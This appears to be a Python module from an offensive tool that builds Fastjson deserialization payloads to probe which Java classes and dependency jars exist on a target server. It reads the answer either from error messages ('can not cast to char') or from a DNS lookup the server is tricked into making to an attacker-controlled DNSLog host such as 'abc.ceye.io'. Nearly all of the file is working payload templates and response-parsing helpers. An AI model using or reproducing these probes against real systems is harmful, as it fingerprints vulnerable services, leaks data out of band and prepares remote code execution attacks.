"""Payload builders for Fastjson dependency (jar) existence probes."""

from __future__ import annotations

# Character cast side-channel (error echo required).
# Class exists  -> response contains "can not cast to char"
# Class missing -> typically Spring "No message available" / no cast marker
CHARACTER_PAYLOAD_TEMPLATE = (
    '{"x":{"@type":"java.lang.Character"'
    '{"@type":"java.lang.Class","val":"${clazz}"}}}'
)

# DNS side-channel: Locale language loads Class; only when Class exists does
# Locale construct successfully and Inet4Address resolve `country` as DNS name.
# Intentionally malformed JSON (Fastjson MiscCodec). Version/autoType sensitive;
# often fails on local labs — Character probe remains the default.
DNS_LOCALE_PAYLOAD_TEMPLATE = (
    '{"@type":"java.net.Inet4Address","val":{"@type":"java.lang.String"'
    '{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{'
    '"@type":"java.lang.String""@type":"java.util.Locale",'
    '"language":{"@type":"java.lang.String"'
    '{1:{"@type":"java.lang.Class","val":"${clazz}"}},'
    '"country":"${dns_host}"}}}}'
)

CAST_MARKERS = (
    "can not cast to char",
    "can not cast to java.lang.Character",
    "cannot cast to char",
)


def character_payload(clazz: str) -> str:
    return CHARACTER_PAYLOAD_TEMPLATE.replace("${clazz}", clazz)


def dns_locale_payload(clazz: str, dns_host: str) -> str:
    """Build Locale+Inet4Address DNS dependency probe.

    ``dns_host`` should be a DNSLog subdomain label safe as Locale country
    (prefer short host without scheme), e.g. ``abc.ceye.io``.
    """
    host = dns_host.strip().rstrip(".")
    if "://" in host:
        host = host.split("://", 1)[1]
    host = host.split("/", 1)[0]
    return (
        DNS_LOCALE_PAYLOAD_TEMPLATE.replace("${clazz}", clazz).replace(
            "${dns_host}", host
        )
    )


def response_indicates_class_present(text: str) -> bool:
    lower = (text or "").lower()
    return any(m.lower() in lower for m in CAST_MARKERS)


def response_indicates_class_absent(text: str) -> bool:
    """Negative side-channel markers commonly seen when Class load fails."""
    lower = (text or "").lower()
    if "no message available" in lower:
        return True
    if "autotype is not support" in lower:
        return True
    if "class not found" in lower or "classnotfound" in lower:
        return True
    return False
